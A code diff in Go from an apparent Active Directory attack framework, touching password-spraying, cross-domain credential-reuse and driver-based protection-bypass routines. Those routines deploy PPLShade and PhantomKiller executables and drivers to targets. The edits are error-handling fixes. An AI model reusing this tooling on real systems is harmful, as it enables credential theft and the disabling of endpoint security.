@@ -211,8 +211,9 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 					Source: "cross_domain_reuse", Key: key,
 					Value: cred.Secret, Confidence: 0.9, Timestamp: time.Now(),
 				})
+			} else {
+				cdAccountFails[key]++
 			}
-			cdAccountFails[key]++
 		}
 	}
 
@@ -600,13 +601,21 @@ func runPPLShadeBypass(ctx context.Context, target tools.NetExecTarget) {
 
 	shadePath, _, sErr := tools.Deploy(ctx, target, "PPLShade.exe", "", "")
 	if sErr != nil || shadePath == "" {
-		utils.StepWarn("Deploy PPLShade.exe failed: " + sErr.Error())
+		msg := "Deploy PPLShade.exe failed"
+		if sErr != nil {
+			msg += ": " + sErr.Error()
+		}
+		utils.StepWarn(msg)
 		return
 	}
 
 	driverPath, _, dErr := tools.Deploy(ctx, target, "LECOMAx64.sys", "", "")
 	if dErr != nil || driverPath == "" {
-		utils.StepWarn("Deploy LECOMAx64.sys failed: " + dErr.Error())
+		msg := "Deploy LECOMAx64.sys failed"
+		if dErr != nil {
+			msg += ": " + dErr.Error()
+		}
+		utils.StepWarn(msg)
 		tools.CleanupRemote(ctx, target, shadePath)
 		return
 	}
@@ -666,13 +675,25 @@ func runPhantomKillerBypass(ctx context.Context, target tools.NetExecTarget) {
 
 	phantomPath, _, pErr := tools.Deploy(ctx, target, "PhantomKiller.exe", "", "")
 	if pErr != nil || phantomPath == "" {
-		utils.StepWarn("Deploy PhantomKiller.exe failed: " + pErr.Error())
+		msg := "Deploy PhantomKiller.exe failed"
+		if pErr != nil {
+			msg += ": " + pErr.Error()
+		} else {
+			msg += ": empty remote path"
+		}
+		utils.StepWarn(msg)
 		return
 	}
 
 	driverPath, _, dErr := tools.Deploy(ctx, target, "PhantomKiller.sys", "", "")
 	if dErr != nil || driverPath == "" {
-		utils.StepWarn("Deploy PhantomKiller.sys failed: " + dErr.Error())
+		msg := "Deploy PhantomKiller.sys failed"
+		if dErr != nil {
+			msg += ": " + dErr.Error()
+		} else {
+			msg += ": empty remote path"
+		}
+		utils.StepWarn(msg)
 		tools.CleanupRemote(ctx, target, phantomPath)
 		return
 	}
